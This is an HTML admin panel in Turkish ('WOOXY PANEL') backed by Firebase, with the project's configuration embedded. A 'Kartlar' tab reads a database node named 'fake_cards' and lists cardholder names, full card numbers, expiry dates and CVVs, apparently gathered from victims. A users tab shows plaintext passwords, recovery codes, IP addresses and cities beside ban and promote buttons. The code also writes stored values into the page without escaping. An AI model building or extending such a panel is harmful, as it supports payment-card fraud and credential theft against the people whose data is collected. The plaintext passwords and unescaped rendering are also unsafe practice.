<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WOOXY ADMIN CONTROL</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        /* --- GENEL TASARIM --- */
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background-color: #080808; color: white; font-family: 'Segoe UI', sans-serif; min-height: 100vh; overflow: hidden; }
        .admin-layout { display: flex; height: 100vh; width: 100%; }
        
        /* SIDEBAR */
        .sidebar { width: 260px; background-color: #111; display: flex; flex-direction: column; border-right: 1px solid #222; padding-top: 20px; }
        .radio-container { position: relative; display: flex; flex-direction: column; gap: 5px; padding: 0 15px; }
        .radio-container input { display: none; }
        .radio-container label { padding: 12px 15px; cursor: pointer; border-radius: 8px; transition: 0.3s; color: #888; font-weight: 500; z-index: 2; }
        .radio-container input:checked + label { color: #000; }
        .glider-container { position: absolute; top: 0; left: 15px; width: calc(100% - 30px); height: 100%; pointer-events: none; }
        .glider { position: absolute; height: 45px; width: 100%; background-color: #fffb00; border-radius: 8px; transition: 0.3s ease-out; box-shadow: 0 0 15px #fffb00; }
        
        /* Glider Animasyon G√ºncelleme */
        #radio-data:checked ~ .glider-container .glider { transform: translateY(0); }
        #radio-veriler:checked ~ .glider-container .glider { transform: translateY(50px); }
        #radio-cards:checked ~ .glider-container .glider { transform: translateY(100px); }

        /* CONTENT */
        .content { flex-grow: 1; padding: 30px; overflow-y: auto; background: radial-gradient(circle at top right, #151515, #080808); }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 40px; }
        .stat-card { background: #121212; padding: 20px; border-radius: 12px; border: 1px solid #222; text-align: center; }
        .stat-value { font-size: 2em; font-weight: bold; color: #fffb00; }

        /* KART TABLOSU √ñZEL STƒ∞LLERƒ∞ */
        .card-table-container { background: #111; border-radius: 12px; border: 1px solid #222; padding: 15px; width: 100%; overflow-x: auto; }
        .card-table { width: 100%; border-collapse: collapse; text-align: left; }
        .card-table th { color: #fffb00; padding: 15px; border-bottom: 2px solid #222; font-size: 13px; text-transform: uppercase; }
        .card-table td { padding: 15px; border-bottom: 1px solid #1a1a1a; font-size: 14px; color: #eee; }
        .badge { padding: 4px 10px; border-radius: 5px; font-weight: bold; font-size: 10px; }
        .badge-visa { background: #1a1f71; color: white; }
        .badge-master { background: #eb001b; color: white; }
        .badge-other { background: #444; color: white; }

        /* KULLANICI KARTLARI */
        .card { background: #121212; padding: 20px; border-radius: 12px; margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center; border: 1px solid #222; position: relative; }
        .status-dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; margin-right: 8px; transition: 0.3s; }
        .status-online { background-color: #48ff00; box-shadow: 0 0 10px #48ff00; }
        .status-offline { background-color: #555; box-shadow: none; }

        /* BUTONLAR */
        .action-btn, .modal-action-btn { padding: 0.6rem 1.2rem; font-weight: 700; font-size: 11px; background: #fff; color: #000; cursor: pointer; border-radius: 0.5rem; border-top: 2px solid white; border-left: 2px solid white; transition-duration: 0.4s; text-transform: uppercase; }
        .btn-promote { color: blueviolet; border-bottom: 2px solid blueviolet; border-right: 2px solid blueviolet; }
        .btn-promote:hover { border-top-color: blueviolet; border-left-color: blueviolet; box-shadow: rgba(240, 46, 170, 0.4) 5px 5px; }
        .btn-ban { color: #ff4d4d; border-bottom: 2px solid #ff4d4d; border-right: 2px solid #ff4d4d; }
        .btn-ban:hover { border-top-color: #ff4d4d; border-left-color: #ff4d4d; box-shadow: rgba(255, 77, 77, 0.4) 5px 5px; }
        .btn-whitelist { color: #2ecc71; border-bottom: 2px solid #2ecc71; border-right: 2px solid #2ecc71; }
        .btn-whitelist:hover { border-top-color: #2ecc71; border-left-color: #2ecc71; box-shadow: rgba(46, 204, 113, 0.4) 5px 5px; }

        /* MODAL VE POPUP */
        #customConfirmModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.92); backdrop-filter: blur(8px); z-index: 9999; justify-content: center; align-items: center; }
        .modal-box { background: #0e0e1a; padding: 50px; border-radius: 25px; border: 1px solid #1f4c65; text-align: center; width: 500px; }
        .logout-btn { margin: auto 20px 20px; padding: 12px; border: 1px solid #ff4d4d; color: #ff4d4d; background: transparent; cursor: pointer; border-radius: 8px; }
        .info-popup { visibility: hidden; opacity: 0; position: absolute; bottom: 100%; left: 10px; background: #fffb00; color: #000; padding: 12px; border-radius: 8px; font-size: 11px; font-weight: bold; z-index: 100; transition: 0.3s; white-space: nowrap; box-shadow: 0 5px 20px rgba(255, 251, 0, 0.4); pointer-events: none; margin-bottom: 10px; line-height: 1.4; }
        .card:hover .info-popup { visibility: visible; opacity: 1; }
    </style>
</head>
<body>

    <div id="customConfirmModal">
        <div class="modal-box">
            <h2 id="modalText" style="margin-bottom:40px; color: #fff; letter-spacing: 1px;">Emin misin?</h2>
            <div style="display: flex; justify-content: center;">
                <button class="modal-action-btn btn-modal-cancel" onclick="closeModal()">ƒ∞PTAL</button>
                <button class="modal-action-btn btn-modal-confirm" id="confirmYesBtn">ONAYLIYORUM</button>
            </div>
        </div>
    </div>

    <div class="admin-layout">
        <aside class="sidebar">
            <h2 style="text-align: center; color:#fffb00; margin-bottom: 30px;">WOOXY PANEL</h2>
            <div class="radio-container">
                <input checked id="radio-data" name="radio" type="radio" onclick="switchTab('data')" />
                <label for="radio-data">Kullanƒ±cƒ±lar</label>
                
                <input id="radio-veriler" name="radio" type="radio" onclick="switchTab('veriler')" />
                <label for="radio-veriler">Blacklist</label>

                <input id="radio-cards" name="radio" type="radio" onclick="switchTab('cards')" />
                <label for="radio-cards">üí≥ Kartlar</label>
                
                <div class="glider-container"><div class="glider"></div></div>
            </div>
            <button onclick="window.location.href='index.html'" class="logout-btn">√áƒ±kƒ±≈ü Yap</button>
        </aside>

        <main class="content">
            <div id="stats-header" class="stats-grid">
                <div class="stat-card">Kayƒ±tlƒ±<div id="stat-total-reg" class="stat-value">0</div></div>
                <div class="stat-card">Aktif<div id="stat-active" class="stat-value">0</div></div>
                <div class="stat-card">Yasaklƒ±<div id="stat-total-ban" class="stat-value">0</div></div>
            </div>

            <section id="tab-data"><div id="userListDisplay"></div></section>
            <section id="tab-veriler" style="display: none;"><div id="blacklistDisplay"></div></section>
            
            <section id="tab-cards" style="display: none;">
                <div class="card-table-container">
                    <table class="card-table">
                        <thead>
                            <tr>
                                <th>Sahibi</th>
                                <th>Kart Numarasƒ±</th>
                                <th>SKT</th>
                                <th>CVV</th>
                                <th>T√ºr</th>
                                <th>ƒ∞≈ülem</th>
                            </tr>
                        </thead>
                        <tbody id="cardsTableBody">
                            <tr><td colspan="6" style="text-align:center;">Y√ºkleniyor...</td></tr>
                        </tbody>
                    </table>
                </div>
            </section>
        </main>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyB6XlCbPxs6I1jJThZ6OTiaJ-Xssw_mkbA",
            authDomain: "wooxyproject.firebaseapp.com",
            databaseURL: "https://wooxyproject-default-rtdb.firebaseio.com/",
            projectId: "wooxyproject",
            storageBucket: "wooxyproject.firebasestorage.app",
            messagingSenderId: "932458468968",
            appId: "1:932458468968:web:ca0e8230bfae415f3c8ddd"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        let pendingAction = null;

        function switchTab(tab) {
            document.getElementById('tab-data').style.display = tab === 'data' ? 'block' : 'none';
            document.getElementById('tab-veriler').style.display = tab === 'veriler' ? 'block' : 'none';
            document.getElementById('tab-cards').style.display = tab === 'cards' ? 'block' : 'none';
            
            // Kartlar sekmesine ge√ßince istatistikleri gizleyebiliriz (isteƒüe baƒülƒ±)
            document.getElementById('stats-header').style.display = tab === 'cards' ? 'none' : 'grid';

            if(tab === 'cards') loadCards();
        }

        // KARTLARI √áEKEN FONKSƒ∞YON
        function loadCards() {
            db.ref('fake_cards').on('value', (snapshot) => {
                const tbody = document.getElementById('cardsTableBody');
                tbody.innerHTML = "";
                const data = snapshot.val();
                
                if(!data) {
                    tbody.innerHTML = "<tr><td colspan='6' style='text-align:center;'>Hen√ºz kart d√º≈ümedi.</td></tr>";
                    return;
                }

                for(let category in data) {
                    for(let cardId in data[category]) {
                        const card = data[category][cardId];
                        const badgeClass = category === 'Visa' ? 'badge-visa' : (category === 'Mastercard' ? 'badge-master' : 'badge-other');
                        
                        tbody.innerHTML += `
                            <tr>
                                <td style="font-weight:bold; color:#fffb00;">${card.holder_name || 'Bilinmiyor'}</td>
                                <td style="letter-spacing:1.5px;">${card.card_number}</td>
                                <td>${card.expiry_date}</td>
                                <td style="color:#ff4d4d; font-weight:bold;">${card.cvv}</td>
                                <td><span class="badge ${badgeClass}">${category.toUpperCase()}</span></td>
                                <td>
                                    <button class="action-btn btn-ban" style="padding:4px 8px; font-size:9px;" 
                                    onclick="openConfirm('Bu kart verisini silmek istediƒüine emin misin?', () => db.ref('fake_cards/${category}/${cardId}').remove())">Sƒ∞L</button>
                                </td>
                            </tr>
                        `;
                    }
                }
            });
        }

        function openConfirm(text, action) {
            document.getElementById('modalText').innerText = text;
            document.getElementById('customConfirmModal').style.display = 'flex';
            pendingAction = action;
        }

        function closeModal() {
            document.getElementById('customConfirmModal').style.display = 'none';
            pendingAction = null;
        }

        document.getElementById('confirmYesBtn').onclick = () => {
            if (pendingAction) pendingAction();
            closeModal();
        };

        // KULLANICI Lƒ∞STESƒ∞ Dƒ∞NLEYƒ∞Cƒ∞
        db.ref('users').on('value', (snapshot) => {
            const users = snapshot.val();
            const userList = document.getElementById('userListDisplay');
            const blackList = document.getElementById('blacklistDisplay');
            let total = 0, onlineCount = 0, bannedCount = 0;
            
            userList.innerHTML = ""; blackList.innerHTML = "";
            if (!users) return;

            for (let id in users) {
                const u = users[id];
                total++;
                const userName = u.username || id;
                const userPass = u.pass || "Girilmemi≈ü"; 
                const recoveryCode = u.recoveryCode || "YOK";
                const isBanned = u.isBanned || false;
                const role = u.role || 'user';
                const lastLogin = u.lastLogin || "Hen√ºz Yok";
                const isOnline = u.status === "online" || u.isOnline === true; 

                const infoBox = `
                    <div class="info-popup">
                        üåê IP: ${u.ip || 'Gizli'}<br>
                        üîë ≈ûƒ∞FRE: ${userPass}<br>
                        üõ°Ô∏è KOD: ${recoveryCode}<br>
                        üìç KONUM: ${u.city || 'Bilinmiyor'}<br>
                        üïí KAYIT: ${u.regDate || 'Bilinmiyor'}<br>
                        üïí SON Gƒ∞Rƒ∞≈û: ${lastLogin}
                    </div>`;

                if (isBanned) {
                    bannedCount++;
                    blackList.innerHTML += `
                    <div class="card">
                        ${infoBox}
                        <span>üö´ <b>${userName}</b> <small style="color:#fffb00; margin-left:10px;">(KOD: ${recoveryCode})</small></span>
                        <button class="action-btn btn-whitelist" onclick="openConfirm('${userName} Whitelist verilsin mi?', () => db.ref('users/${id}').remove())">WHITELIST VER</button>
                    </div>`;
                } else {
                    if(isOnline) onlineCount++;
                    let roleButton = role === 'admin' 
                        ? `<button class="action-btn btn-demote" onclick="openConfirm('${userName} yetkisi ALINSIN MI?', () => db.ref('users/${id}').update({role:'user'}))">YETKƒ∞ AL</button>`
                        : `<button class="action-btn btn-promote" onclick="openConfirm('${userName} yetki verilsin mi?', () => db.ref('users/${id}').update({role:'admin'}))">YETKƒ∞ VER</button>`;

                    userList.innerHTML += `
                    <div class="card">
                        ${infoBox}
                        <div>
                            <span class="status-dot ${isOnline ? 'status-online' : 'status-offline'}"></span>
                            <strong>${userName}</strong> ${role === 'admin' ? '<span style="color:#fffb00; font-size:10px;">[ADMƒ∞N]</span>' : ''}
                            <br><small style="color:#fffb00; font-size:11px; font-weight:bold;">≈ûƒ∞FRE: ${userPass} | KOD: ${recoveryCode}</small>
                            <br><small style="color:#666; font-size:10px;">IP: ${u.ip || '---'}</small>
                        </div>
                        <div style="display:flex; gap:12px;">
                            ${roleButton}
                            <button class="action-btn btn-ban" onclick="openConfirm('${userName} BANLANSIN MI?', () => db.ref('users/${id}').update({isBanned:true}))">BANLA</button>
                        </div>
                    </div>`;
                }
            }
            document.getElementById('stat-total-reg').innerText = total;
            document.getElementById('stat-active').innerText = onlineCount;
            document.getElementById('stat-total-ban').innerText = bannedCount;
        });
    </script>
</body>
</html>